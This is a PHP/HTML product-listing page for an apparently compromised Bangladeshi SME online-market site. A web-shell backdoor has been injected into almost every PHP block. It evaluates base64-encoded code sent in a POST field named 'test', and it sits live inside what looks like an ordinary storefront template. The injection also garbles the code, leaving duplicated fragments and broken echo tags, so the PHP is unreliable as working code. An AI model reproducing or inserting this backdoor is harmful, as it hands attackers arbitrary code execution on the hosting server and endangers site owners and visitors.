<?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}
	include('dbconnect.php');
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>:: Welcome to SME.COM.BD :.</title>
<link href="css/mynul_bng.css" type="text/css" rel="stylesheet" />
</head>
<body>
<table width="1013" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
  <tr>
    <td><?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} include('Head_Online.php'); ?></td>
  </tr>
  <tr>
    <td><table width="100%" cellspacing="0" cellpadding="0">
      <tr>
        <td width="228" valign="top"><?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} include('LeftMenu_OnlineMarket.php'); ?></td>
        <td valign="top"><table width="574" cellspacing="0" cellpadding="0">
          <tr>
            <td><img src="images/sme_inner_10.jpg" alt="" width="574" height="36" /></td>
          </tr>
          <tr>
            <td><table width="570" border="0" align="center" cellpadding="2" cellspacing="2">
                <tr>
                  <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} 
			$sqlProdDt=mysql_query("SELECT * FROM omp WHERE Status!=1 ORDER BY ProductId DESC");
					$count=0;
					while ($dtProdDtl=mysql_fetch_array($sqlProdDt)) 
					  {
						$ProductId=$dtProdDtl['ProductId'];
						$Product=$dtProdDtl['Product'];
						$Photo=$dtProdDtl['Photo'];
						$Cost=$dtProdDtl['Cost'];
						if($count%4==0) 
						 {
			?>
                </tr>
                <tr>
                  <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}										 
				 		}										  
			  ?>
                  <td align="center" style="border-bottom:#CCCCCC 1px solid"><a class="menu-link" href="ProductDetails.php?ProductId=<?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$ProductId;?>"> <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} echo "<img src='Thumbnail/$Photo' border=0 width=100 height=100>";?><br />
                        <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$Product;?>
                        <br />
                        <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$Cost;?>
                  </a> </td>
                  <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}
					   $count++; 
					  } 
					?>
                </tr>
                <tr>
                  <td align="center"><img src="images/trans.gif" width="10" height="7" /></td>
                </tr>
            </table></td>
          </tr>
          <tr>
            <td>&nbsp;</td>
          </tr>
        </table></td>
        <td width="215" valign="top"><?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} include('RightMenu_OnlineMarket.php'); ?></td>
      </tr>
    </table></td>
  </tr>
  <tr>
    <td><?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} include('footer.php'); ?></td>
  </tr>
</table>

</body>
</html>
